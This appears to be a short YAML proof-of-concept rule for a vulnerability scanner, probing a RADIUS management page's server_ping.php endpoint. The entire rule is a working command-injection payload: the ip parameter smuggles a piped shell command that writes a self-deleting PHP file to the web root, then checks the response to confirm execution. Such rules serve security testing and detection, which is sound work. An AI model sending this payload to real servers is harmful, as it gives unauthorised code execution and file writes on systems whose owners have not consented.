rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b"parent.doTestResult")
    request:
      cache: true
      method: GET
      path: /manager/radius/server_ping.php?ip=127.0.0.1|echo%20"<?php%20echo%20md5({{r2}});unlink(__FILE__);?>">../../{{r2}}.php&id=1
